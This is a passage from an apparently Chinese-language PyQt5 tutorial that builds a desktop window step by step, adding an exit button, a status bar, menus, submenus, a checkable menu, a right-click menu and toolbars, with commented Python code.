<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QPushButton, QMessageBox, QToolTip, QDesktopWidget</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框的字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建直接退出按钮</span></span><br><span class="line">        btn = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置状态栏</span></span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)</span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        reply = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> reply == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        window_frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        desktop_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        window_frame.moveCenter(desktop_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(window_frame.topLeft())	<span class="comment"># 然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QDesktopWidget, qApp</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QPushButton, QMessageBox, QToolTip, QAction</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框的字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建直接退出按钮</span></span><br><span class="line">        btn = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置状态栏</span></span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)  <span class="comment"># 状态栏初始信息</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置菜单栏</span></span><br><span class="line">        menubar = self.menuBar() <span class="comment"># 创建菜单栏</span></span><br><span class="line">        fileMenu = menubar.addMenu(<span class="string">&quot;&amp;文件&quot;</span>) <span class="comment"># 创建文件菜单</span></span><br><span class="line"></span><br><span class="line">        exitAct = QAction(QIcon(<span class="string">&quot;exit.png&quot;</span>), <span class="string">&quot;&amp;退出&quot;</span>, self) <span class="comment"># 创建动作</span></span><br><span class="line">        exitAct.setStatusTip(<span class="string">&quot;退出程序&quot;</span>)    <span class="comment"># 设置鼠标悬浮时的状态栏信息</span></span><br><span class="line">        exitAct.setShortcut(<span class="string">&quot;Ctrl+Q&quot;</span>)   <span class="comment"># 设置快捷键</span></span><br><span class="line">        exitAct.triggered.connect(qApp.quit) <span class="comment"># 触发==点击或使用了快捷键</span></span><br><span class="line"></span><br><span class="line">        fileMenu.addAction(exitAct) <span class="comment"># 向文件菜单中添加行为</span></span><br><span class="line">        </span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        reply = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> reply == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        window_frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        desktop_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        window_frame.moveCenter(desktop_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(window_frame.topLeft())	<span class="comment"># 然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<h3 id="子菜单"><a href="#子菜单" class="headerlink" title="子菜单"></a>子菜单</h3><blockquote>
<p>QMenu</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QDesktopWidget, qApp, QMenu</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QPushButton, QMessageBox, QToolTip, QAction</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框的字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建直接退出按钮</span></span><br><span class="line">        exitButton = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        exitButton.resize(exitButton.sizeHint())</span><br><span class="line">        exitButton.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        exitButton.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置状态栏</span></span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)  <span class="comment"># 状态栏初始信息</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置菜单栏</span></span><br><span class="line">        <span class="comment"># 动作</span></span><br><span class="line">        exitAction = QAction(QIcon(<span class="string">&quot;exit.png&quot;</span>), <span class="string">&quot;&amp;退出&quot;</span>, self) <span class="comment"># &amp;有影响，但不明显，暂时忽略</span></span><br><span class="line">        exitAction.setStatusTip(<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">        exitAction.setShortcut(<span class="string">&quot;Ctrl+Q&quot;</span>)</span><br><span class="line">        exitAction.triggered.connect(qApp.quit)</span><br><span class="line">        </span><br><span class="line">        newAction = QAction(QIcon(<span class="string">&quot;new,png&quot;</span>), <span class="string">&quot;&amp;新建&quot;</span>, self)</span><br><span class="line">        </span><br><span class="line">        impAction = QAction(<span class="string">&quot;导入邮箱&quot;</span>, self)</span><br><span class="line">        </span><br><span class="line">		<span class="comment"># 导入子菜单</span></span><br><span class="line">        impMenu = QMenu(<span class="string">&quot;导入&quot;</span>, self)</span><br><span class="line">        impMenu.addAction(impAction)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 菜单栏</span></span><br><span class="line">        menubar = self.menuBar() <span class="comment"># 创建菜单栏</span></span><br><span class="line">        fileMenu = menubar.addMenu(<span class="string">&quot;&amp;文件&quot;</span>) <span class="comment"># 创建文件菜单</span></span><br><span class="line">        fileMenu.addAction(exitAction)</span><br><span class="line">        fileMenu.addMenu(impMenu)</span><br><span class="line">        </span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        isExit = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> isExit == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        screen_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        frame.moveCenter(screen_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(frame.topLeft())	<span class="comment"># 然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/4-subMenu.png" alt="4-subMenu"></p>
<h3 id="勾选菜单"><a href="#勾选菜单" class="headerlink" title="勾选菜单"></a>勾选菜单</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QDesktopWidget, qApp, QMenu</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QPushButton, QMessageBox, QToolTip, QAction</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框的字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建直接退出按钮</span></span><br><span class="line">        exitButton = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        exitButton.resize(exitButton.sizeHint())</span><br><span class="line">        exitButton.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        exitButton.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置状态栏</span></span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)  <span class="comment"># 状态栏初始信息</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置菜单栏</span></span><br><span class="line">        <span class="comment"># 动作</span></span><br><span class="line">        exitAction = QAction(QIcon(<span class="string">&quot;exit.png&quot;</span>), <span class="string">&quot;&amp;退出&quot;</span>, self) <span class="comment"># &amp;有影响，但不明显，暂时忽略</span></span><br><span class="line">        exitAction.setStatusTip(<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">        exitAction.setShortcut(<span class="string">&quot;Ctrl+Q&quot;</span>)</span><br><span class="line">        exitAction.triggered.connect(qApp.quit)</span><br><span class="line">        </span><br><span class="line">        newAction = QAction(QIcon(<span class="string">&quot;new,png&quot;</span>), <span class="string">&quot;&amp;新建&quot;</span>, self)</span><br><span class="line">        </span><br><span class="line">        impAction = QAction(<span class="string">&quot;导入邮箱&quot;</span>, self)</span><br><span class="line">        </span><br><span class="line">        viewStatAction = QAction(<span class="string">&quot;查看状态栏&quot;</span>, self)</span><br><span class="line">        viewStatAction.setCheckable(<span class="literal">True</span>)</span><br><span class="line">        viewStatAction.setChecked(<span class="literal">True</span>)</span><br><span class="line">        viewStatAction.setStatusTip(<span class="string">&quot;查看状态栏&quot;</span>)</span><br><span class="line">        viewStatAction.triggered.connect(self.toggleMenu) <span class="comment"># 切换菜单</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment"># 导入子菜单</span></span><br><span class="line">        impMenu = QMenu(<span class="string">&quot;导入&quot;</span>, self)</span><br><span class="line">        impMenu.addAction(impAction)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 文件菜单</span></span><br><span class="line">        fileMenu = QMenu(<span class="string">&quot;&amp;文件&quot;</span>, self) <span class="comment"># 创建文件菜单</span></span><br><span class="line">        fileMenu.addAction(exitAction)</span><br><span class="line">        fileMenu.addMenu(impMenu)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 勾选菜单</span></span><br><span class="line">        viewMenu = QMenu(<span class="string">&quot;&amp;查看&quot;</span>, self)</span><br><span class="line">        viewMenu.addAction(viewStatAction)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 菜单栏</span></span><br><span class="line">        menubar = self.menuBar() <span class="comment"># 创建菜单栏</span></span><br><span class="line">        menubar.addMenu(fileMenu)</span><br><span class="line">        menubar.addMenu(viewMenu)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">toggleMenu</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="keyword">if</span> state:</span><br><span class="line">            self.statusBar().show()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.statusBar().hide()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        isExit = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> isExit == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        screen_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        frame.moveCenter(screen_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(frame.topLeft())	<span class="comment"># 然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<h3 id="右键菜单"><a href="#右键菜单" class="headerlink" title="右键菜单"></a>右键菜单</h3><p>右键菜单也是菜单(QMenu)。</p>
<p>在上一节的代码中添加以下方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 菜单栏右键菜单</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">contextMenuEvent</span>(<span class="params">self, QContextMenuEvent</span>):</span><br><span class="line">        rightClickMenu = QMenu(self)</span><br><span class="line">        newAction = rightClickMenu.addAction(<span class="string">&quot;新建&quot;</span>)</span><br><span class="line">        openAction = rightClickMenu.addAction(<span class="string">&quot;打开&quot;</span>)</span><br><span class="line">        quitAction = rightClickMenu.addAction(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">        <span class="comment"># 监听点击动作绑定的事件</span></span><br><span class="line">        action = rightClickMenu.exec_(self.mapToGlobal(QContextMenuEvent.pos())) <span class="comment"># .exec_()方法用来显示菜单，从鼠标右键事件中获得当前相对坐标，然后再转换为绝对坐标</span></span><br><span class="line">        <span class="keyword">if</span> action == quitAction:</span><br><span class="line">            qApp.quit()</span><br></pre></td></tr></table></figure>

<h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><p>菜单栏包含所有的命令，工具栏则是常用命令的集合。(不一定，有时候工具栏比菜单栏还要丰富)</p>
<p>菜单栏只有一个，工具栏可以有多个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QDesktopWidget, qApp, QMenu</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QPushButton, QMessageBox, QToolTip, QAction</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置提示框的字体</span></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 直接退出按钮</span></span><br><span class="line">        exitButton = QPushButton(<span class="string">&quot;直接退出&quot;</span>, self)</span><br><span class="line">        exitButton.resize(exitButton.sizeHint())</span><br><span class="line">        exitButton.move(<span class="number">200</span>, <span class="number">100</span>)</span><br><span class="line">        exitButton.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 状态栏</span></span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)  <span class="comment"># 状态栏初始信息</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置菜单栏</span></span><br><span class="line">        <span class="comment"># 一级动作</span></span><br><span class="line">        exitAction = QAction(QIcon(<span class="string">&quot;exit.png&quot;</span>), <span class="string">&quot;&amp;退出&quot;</span>, self) <span class="comment"># &amp;有影响，但不明显，暂时忽略</span></span><br><span class="line">        exitAction.setStatusTip(<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">        exitAction.setShortcut(<span class="string">&quot;Ctrl+Q&quot;</span>)</span><br><span class="line">        exitAction.triggered.connect(qApp.quit)</span><br><span class="line">        </span><br><span class="line">        viewStatAction = QAction(<span class="string">&quot;查看状态栏&quot;</span>, self)</span><br><span class="line">        viewStatAction.setCheckable(<span class="literal">True</span>)</span><br><span class="line">        viewStatAction.setChecked(<span class="literal">True</span>)</span><br><span class="line">        viewStatAction.setStatusTip(<span class="string">&quot;查看状态栏&quot;</span>)</span><br><span class="line">        viewStatAction.triggered.connect(self.toggleMenu) <span class="comment"># 切换菜单</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 一级菜单：文件</span></span><br><span class="line">        fileMenu = QMenu(<span class="string">&quot;&amp;文件&quot;</span>, self) <span class="comment"># 创建文件菜单</span></span><br><span class="line">        fileMenu.addAction(exitAction)</span><br><span class="line">        fileMenu.addMenu(self.impMenu())</span><br><span class="line">        fileMenu.addMenu(self.newMenu())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 一级菜单：查看</span></span><br><span class="line">        viewMenu = QMenu(<span class="string">&quot;&amp;查看&quot;</span>, self)</span><br><span class="line">        viewMenu.addAction(viewStatAction)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 菜单栏</span></span><br><span class="line">        menubar = self.menuBar() <span class="comment"># 创建菜单栏</span></span><br><span class="line">        menubar.addMenu(fileMenu)</span><br><span class="line">        menubar.addMenu(viewMenu)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 工具栏</span></span><br><span class="line">        self.toobar = self.addToolBar(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">        self.toobar.addAction(exitAction)</span><br><span class="line">        self.toobar = self.addToolBar(<span class="string">&quot;查看&quot;</span>)</span><br><span class="line">        self.toobar.addAction(viewStatAction)</span><br><span class="line"></span><br><span class="line">        self.setGeometry(<span class="number">800</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">300</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;PyQt5快速入门&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 二级菜单：新建</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">newMenu</span>(<span class="params">self</span>):</span><br><span class="line">        menu = QMenu(<span class="string">&quot;新建&quot;</span>, self)</span><br><span class="line">        new_pythonfile = QAction(<span class="string">&quot;新建Python文件&quot;</span>, self)</span><br><span class="line">        menu.addAction(new_pythonfile)</span><br><span class="line">        <span class="keyword">return</span> menu</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 二级菜单：导入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">impMenu</span>(<span class="params">self</span>):</span><br><span class="line">        menu = QMenu(<span class="string">&quot;导入&quot;</span>, self)</span><br><span class="line">        impAction = QAction(<span class="string">&quot;导入邮箱&quot;</span>, self)</span><br><span class="line">        menu.addAction(impAction)</span><br><span class="line">        <span class="keyword">return</span> menu</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 菜单栏右键菜单</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">contextMenuEvent</span>(<span class="params">self, QContextMenuEvent</span>):</span><br><span class="line">        rightClickMenu = QMenu(self)</span><br><span class="line">        newAction = rightClickMenu.addAction(<span class="string">&quot;新建&quot;</span>)</span><br><span class="line">        openAction = rightClickMenu.addAction(<span class="string">&quot;打开&quot;</span>)</span><br><span class="line">        quitAction = rightClickMenu.addAction(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">        <span class="comment"># 监听点击动作绑定的事件</span></span><br><span class="line">        action = rightClickMenu.exec_(self.mapToGlobal(QContextMenuEvent.pos())) <span class="comment"># .exec_()方法用来显示菜单，从鼠标右键事件中获得当前相对坐标，然后再转换为绝对坐标</span></span><br><span class="line">        <span class="keyword">if</span> action == quitAction:</span><br><span class="line">            qApp.quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">toggleMenu</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="keyword">if</span> state:</span><br><span class="line">            self.statusBar().show()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.statusBar().hide()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;退出事件&quot;&quot;&quot;</span></span><br><span class="line">        isExit = QMessageBox.question(self, <span class="string">&quot;消息&quot;</span>, <span class="string">&quot;您确定要退出吗？&quot;</span>, </span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)</span><br><span class="line">        <span class="keyword">if</span> isExit == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        frame = self.frameGeometry()	<span class="comment"># 获得主窗口所在框架</span></span><br><span class="line">        screen_center = QDesktopWidget().availableGeometry().center()	<span class="comment"># 获取显示器框架，并得到屏幕中心点的位置</span></span><br><span class="line">        frame.moveCenter(screen_center)	<span class="comment"># 将主窗口框架的中心，移到屏幕中心</span></span><br><span class="line">        self.move(frame.topLeft())	<span class="comment"># 